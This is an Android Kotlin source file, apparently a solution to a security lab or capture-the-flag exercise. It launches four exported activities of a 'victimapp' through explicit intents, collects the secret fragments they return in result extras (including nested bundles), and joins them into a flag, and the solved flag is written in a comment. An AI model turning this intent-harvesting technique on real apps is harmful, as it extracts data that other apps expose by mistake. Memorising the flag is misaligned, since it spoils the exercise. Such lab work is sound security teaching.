package com.example.lab3justask
import android.content.ComponentName
import android.content.Intent
import android.os.Bundle
import android.util.Log
import android.widget.Toast
import androidx.activity.result.ActivityResult
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity

class MainActivity : AppCompatActivity() {

    private val tag = "MainActivityTest"
    private var finalFlag = mutableListOf<String>("","","","")
    private val receivedResults = mutableSetOf<Int>()


    private val launcher4 = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result: ActivityResult ->
        val resultCode = result.resultCode
        val data = result.data
        Log.i(tag, "onActivityResult -> resultCode=$resultCode, data=$data")

        val extras = data?.extras
        if (extras != null && !extras.isEmpty) {
            for (key in extras.keySet()) {
                var boundle = extras.getBundle(key)
                var boundK = boundle?.keySet()
                while(boundK != null) {
                    for (keyB in boundK) {
                        if (boundle?.getBundle(keyB) == null) {
                            Log.i(tag, " RESULT CODE $resultCode EXTRA: $key -> ${boundle?.getString(keyB)}")
                            boundle?.getString(keyB)?.let { finalFlag[3] += it }

                            handleResult(result.resultCode, result.data?.extras)
                        }
                        boundle = boundle?.getBundle(keyB)

                    }
                    boundK = boundle?.keySet()
                }
            }
        } else {
            Log.i(tag, "No extras in returned Intent")
        }
    }


    private val launcher = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result: ActivityResult ->
        val resultCode = result.resultCode
        val data = result.data
        Log.i(tag, "onActivityResult -> resultCode=$resultCode, data=$data")

        val extras = data?.extras
        if (extras != null && !extras.isEmpty) {
            for (key in extras.keySet()) {
                Log.i(tag, "RESULT CODE $resultCode EXTRA: $key -> ${extras.getString(key)}")
                if(resultCode == 3 && key.equals("hiddenFlag")) {
                    extras.getString(key)?.let { finalFlag[resultCode - 1] = it }
                }
                else if(resultCode != 3){
                    extras.getString(key)?.let { finalFlag[resultCode - 1] = it }
                }

            }
            handleResult(result.resultCode, result.data?.extras)

        } else {
            Log.i(tag, "No extras in returned Intent")
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        setContentView(android.R.layout.simple_list_item_1)

        val i4 = Intent().apply {
            action = "com.example.victimapp.intent.action.JUSTASK"
            component = ComponentName("com.example.victimapp", "com.example.victimapp.PartFour")

        }

        Log.i(tag, "Launching PartFour...")

        launcher4.launch(i4)

        val i3 = Intent().apply {
            action = "com.example.victimapp.intent.action.JUSTASK"
            component = ComponentName("com.example.victimapp", "com.example.victimapp.PartThree")

        }

        Log.i(tag, "Launching PartThree...")

        launcher.launch(i3)

        val i2 = Intent().apply {
            component = ComponentName("com.example.victimapp", "com.example.victimapp.PartTwo")
        }

        Log.i(tag, "Launching PartTwo...")

        launcher.launch(i2)


        val i1 = Intent().apply {
            action = "com.example.victimapp.intent.action.JUSTASK"
            component = ComponentName("com.example.victimapp", "com.example.victimapp.PartOne")

        }

        Log.i(tag, "Launching PartOne...")

        launcher.launch(i1)
    }

    private fun handleResult(resultCode: Int, extras: Bundle?) {
        val key = "FLAG_PART"
        val part = extras?.getString(key) ?: ""

        if (receivedResults.contains(resultCode)) return
        receivedResults.add(resultCode)


        if (receivedResults.containsAll(listOf(1, 2, 3, 4))) {
            var flag = ""

            for(s in finalFlag){
                flag += s
                Log.i("part",s)
            }
            Log.i("FLAG", "Complete flag: $flag")
            Toast.makeText(this, "Complete flag: $flag", Toast.LENGTH_LONG).show()
        }
    }

    //FLAG{Gutta_cavat_lapidem_non_vi_sed_saepe_cadendo}
}
